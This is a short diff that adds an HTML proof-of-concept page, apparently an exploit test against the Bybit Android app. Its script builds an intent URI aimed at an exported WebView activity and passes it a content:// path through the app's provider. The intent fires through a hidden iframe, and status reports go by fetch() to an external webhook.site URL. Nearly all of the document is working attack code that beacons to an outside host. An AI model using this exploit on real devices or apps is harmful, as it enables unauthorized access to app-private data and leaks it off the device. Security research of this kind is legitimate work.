@@ -1,0 +1,13 @@
+<!doctype html><html><body style="font:14px monospace;padding:8px"><h3>MEDIA-READ-TEST</h3><pre id="o">firing</pre>
+<iframe id="f" style="width:1px;height:1px"></iframe>
+<script>
+var HOOK='https://webhook.site/614a038e-d25a-47f6-81d2-966bf1e4426d';
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d||{})})}catch(e){}}
+var u='content://com.bybit.app.adv_provider/root/sdcard/Android/media/com.dsh.urireader/t.html';
+var intent='intent://#Intent;action=android.intent.action.VIEW'
+ +';component=com.bybit.app%2Fcom.zoloz.webcontainer.WebCActivity'
+ +';S.url='+u+';end';
+document.getElementById('o').textContent+='\n'+intent;
+post('MEDIA1_FIRED',{intent:intent});
+document.getElementById('f').src=intent;
+</script></body></html>
